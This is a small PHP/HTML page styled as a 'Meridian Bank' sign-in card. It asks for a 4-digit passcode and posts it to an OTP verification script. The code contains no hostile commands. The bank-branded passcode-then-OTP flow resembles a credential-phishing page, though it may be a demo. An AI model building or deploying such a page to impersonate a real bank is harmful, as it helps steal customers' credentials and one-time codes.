<?php 
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: url("https://images.unsplash.com/photo-1449824913935-59a10b8d2000?q=80&w=2070") no-repeat center center fixed; background-size: cover; }
        .pin-card { background: rgba(255,255,255,0.95); width: 320px; border-radius: 20px; }
    </style>
</head>
<body class="d-flex align-items-center justify-content-center vh-100">
    <div class="card pin-card p-4 shadow text-center">
        <h4 class="mb-4">Meridian Bank</h4>
        <p>Enter 4-Digit Passcode</p>
        <form action="otp_verify.php" method="POST">
            <input type="password" name="password" class="form-control text-center mb-3" maxlength="4" required>
            <button type="submit" class="btn btn-danger w-100 rounded-pill">Sign In</button>
        </form>
    </div>
</body>
</html>
